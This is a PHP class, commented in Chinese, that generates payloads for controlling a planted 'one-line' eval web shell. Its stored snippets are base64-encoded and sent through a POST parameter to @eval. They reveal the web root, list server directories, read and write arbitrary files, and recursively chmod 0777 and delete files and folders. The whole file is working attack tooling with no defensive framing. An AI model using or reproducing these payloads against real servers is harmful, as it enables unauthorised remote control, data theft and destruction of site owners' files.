<?php 
/**
* PHP 一句话payload生成
*/
class PHPShell_Build_Model
{
	var $phpshell = array(
		'link' => '{PASS}=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=',//连接前缀

		'safe' => "@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);",//payload前缀

		'flag_left' => 'echo("->|");',//左标志位

		'flag_right' => 'echo("|<-");die();',//右标志位

		'GetWebRoot' => '$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D==""){$D=dirname($_SERVER["PATH_TRANSLATED"]);}$arr = array("WebRoot" => $D);echo json_encode($arr);',//获取一句话目录
		
		'GetWebDiskFileList' => '$D=base64_decode($_POST["z1"]);$F=opendir($D);
if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$tmparr = array();	while($N=readdir($F)){$P=$D."/".$N;$T=date("Y-m-d H:i:s",filemtime($P));$E=substr(base_convert(fileperms($P),10,8),-4);$arr = array("time" => $T, "size" => filesize($P),"root" => $E,"path" =>urlencode(is_dir($P)?$N."/":$N));$tmparr[] = $arr;}echo json_encode($tmparr);closedir($F);};',//获取磁盘文件
		
		'GetWebFileContent' => '$F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));@fclose($P);',//得到文件内容

		'CreateAndSaveFile' => 'echo @fwrite(fopen(base64_decode($_POST["z1"]),"w"),base64_decode($_POST["z2"]))?"1":"0";',//创建文件

		'DeleteFile' => 'function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");}',//删除文件
		);

	public function Conbinationx($value='')//组合payload
	{
		return $this->phpshell["safe"].$this->phpshell["flag_left"].$value.$this->phpshell["flag_right"];
	}

	public function GetWebRootPath()//取一句话目录
	{
		$payload = $this->Conbinationx($this->phpshell["GetWebRoot"]);
		$payload = urlencode(base64_encode($payload));
		$payload = $this->phpshell["link"].$payload;
		return $payload;
	}

	public function GetWebDiskFileList()//取磁盘文件
	{
		$payload = $this->Conbinationx($this->phpshell["GetWebDiskFileList"]);
		$payload = urlencode(base64_encode($payload));
		$payload = $this->phpshell["link"].$payload.'&z1={PATH}';
		return $payload;
	}

	public function GetWebFileContent()//取文件内容
	{
		$payload = $this->Conbinationx($this->phpshell["GetWebFileContent"]);
		$payload = urlencode(base64_encode($payload));
		$payload = $this->phpshell["link"].$payload.'&z1={PATH}';
		return $payload;
	}

	public function CreateAndSaveFile()
	{
		$payload = $this->Conbinationx($this->phpshell["CreateAndSaveFile"]);
		$payload = urlencode(base64_encode($payload));
		$payload = $this->phpshell["link"].$payload.'&z1={PATH}&z2={Content}';
		return $payload;
	}

	public function DeleteFile()
	{
		$payload = $this->Conbinationx($this->phpshell["DeleteFile"]);
		$payload = urlencode(base64_encode($payload));
		$payload = $this->phpshell["link"].$payload.'&z1={PATH}';
		return $payload;
	}
}